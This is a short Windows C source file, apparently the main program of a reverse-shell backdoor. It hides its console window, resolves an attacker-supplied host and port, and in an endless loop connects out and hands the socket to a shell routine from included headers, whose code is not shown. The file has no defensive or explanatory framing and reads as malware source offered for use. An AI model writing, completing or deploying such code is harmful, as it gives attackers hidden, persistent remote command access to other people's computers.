#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <winsock2.h>

#include "execShell.h"
#include "connect.h"

static char *getAddrByName(const char *name){
    struct hostent *hst = NULL;
    if((hst = gethostbyname(name)) != NULL)
        return inet_ntoa(*((struct in_addr*)hst->h_addr_list[0]));
    return NULL;
}

int main(int argc, char **argv){
    SOCKET s = 0;
    char *ipaddr = NULL;
    uint16_t port = 0;
    setlocale(LC_ALL, "rus");
    FreeConsole();
    if(argc == 3){
        wsaInit();
        if((ipaddr = getAddrByName(argv[1])) != NULL){
            port = atoi(argv[2]);
            while(true){
                if((s = connectServer(ipaddr, port)) != SOCKET_ERROR)
                    shell(s);
            }
        }
    }
    return 0;
}
